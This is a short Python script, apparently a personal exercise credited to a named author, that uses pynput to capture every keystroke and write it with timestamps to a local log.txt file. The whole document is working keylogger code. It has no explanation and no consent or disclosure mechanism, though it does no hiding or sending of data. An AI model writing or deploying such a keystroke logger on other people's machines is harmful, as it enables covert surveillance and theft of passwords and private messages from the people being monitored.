# Javier Ferrándiz Fernández
from time import asctime
from pynput.keyboard \
        import Listener
import logging

logging.basicConfig(
filename=("log.txt"),
level=logging.DEBUG,
format=" %(asctime)s-%(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) \
        as listener:
    listener.join()
    


